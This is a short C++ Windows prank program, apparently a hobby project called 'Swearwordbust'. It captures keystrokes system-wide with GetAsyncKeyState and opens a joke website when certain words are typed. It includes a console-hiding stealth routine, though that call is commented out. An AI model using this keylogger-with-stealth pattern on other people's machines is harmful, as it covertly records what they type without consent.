#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

string swearwords[4] = {"FUCK", "IDIOT", "YOLO", "PORN"};
string txtbuff;

int savetobuff (int key_stroke);
void Stealth();

int main()
{

// SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
// Stealth();

cout << "Swearwordbust lavet af Rasmus C.\n";
cout << "Jeg tager på ingen måde ansvar for brugen eller misbrugen af dette program.";

 char i;
 
 while (1)
 {
  for(i = 8; i <= 190; i++)
  {
    if (GetAsyncKeyState(i) == -32767)
    savetobuff (i);

    // Check for swearwords in string
    for (int j=0; j<4;j++){
        if (txtbuff.find(swearwords[j])!= string::npos){
        system("start www.trololololololololololo.com");
        txtbuff = "";
        }
    }
  }
 }
return 0;
}


int savetobuff (int key_stroke)
{
 if ( (key_stroke == 1) || (key_stroke == 2) )
 return 0;


txtbuff += key_stroke;
cout << txtbuff << endl;

if (txtbuff.size() > 1000) {
    txtbuff = "";
}


 return 0;
}

void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}
